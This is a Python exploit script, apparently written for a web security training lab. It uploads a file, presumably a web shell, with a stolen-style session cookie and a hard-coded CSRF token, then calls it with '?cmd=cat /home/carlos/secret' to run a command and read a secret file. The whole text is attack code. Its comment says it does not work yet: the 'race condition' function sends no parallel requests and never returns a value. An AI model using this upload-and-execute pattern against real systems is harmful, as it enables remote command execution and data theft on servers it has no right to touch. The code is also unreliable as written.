# dedoxd2 not working yet :"/ 
import requests 
import sys
import urllib3

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def exploit_race_contion(base_url,upload_path,file_path , file_name , session_cookie):
    cookies = {"session":session_cookie}
    file = {'file':open(f'{file_name}','rb')}
    params  = {"user":"wiener" , "csrf":"jxJVt9fLw78wZ7zCGurEZHK6movNaYFf"}
    upload_request = requests.post(url=base_url+upload_path,files=file,proxies=proxies,verify=False,cookies=cookies , data=params) # ,params=params)
    if upload_request.status_code != 200 : 
        print("(-) File didn't Uploaded ")
        print("#"*50)
        print(upload_request.text)
        print("#"*50)
        exit(-1)
    print("(+) File Uploaded Successfully")
    print("(+) Now , Trying to retrive it...")
    shell_request = requests.get(base_url+file_path+file_name , proxies=proxies,verify=False,cookies=cookies)

    if shell_request.status_code!=200:
        print("(-) Something Went Wrong ")
        print("#"*50)
        print(shell_request.text)
        print("#"*50)
        exit(-1)
    else:
        solve_lab  = requests.get(base_url+file_path+file_name+'?cmd=cat /home/carlos/secret' , proxies=proxies,verify=False,cookies=cookies)
        print("(+) Secret file content: %s"%solve_lab.text)



    


if __name__ == "__main__":
    try:
        base_url = sys.argv[1]
        upload_path = sys.argv[2]
        file_path = sys.argv[3]
        file_name= sys.argv[4]
        session_cookie = sys.argv[5]
        if exploit_race_contion(base_url,upload_path,file_path , file_name , session_cookie):
            print("(+) Exploitation done sucessfully")
            print("(+) U Could Access the shell via %s" %(base_url+file_path+file_name))
        else:
            print("(-) Something wen wrong")
    except RuntimeError:
        print(RuntimeError)
        print("(-) Usage: %s <url>" % sys.argv[0])
        print("(-) Example: %s https://www.example.com  " % sys.argv[0])
        sys.exit(-1)